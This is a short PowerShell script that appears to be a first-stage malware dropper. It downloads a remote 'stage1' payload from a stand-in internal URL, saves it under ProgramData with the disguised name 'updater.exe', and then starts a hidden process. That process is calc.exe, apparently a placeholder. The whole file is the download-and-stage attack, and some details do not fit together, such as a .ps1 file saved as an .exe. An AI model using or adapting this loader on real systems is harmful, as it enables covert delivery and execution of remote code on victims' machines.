
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PayloadUrl = 'https://internal.corp/stage1.ps1',
    [string]$WorkingPath = "C:\ProgramData\updater.exe",
    [int]$RequestTimeout = 96
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-Stage1Download -SourceUrl $PayloadUrl -DestinationPath $WorkingPath -TimeoutSec $RequestTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
}
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Verbose "stage marker 14 reached"
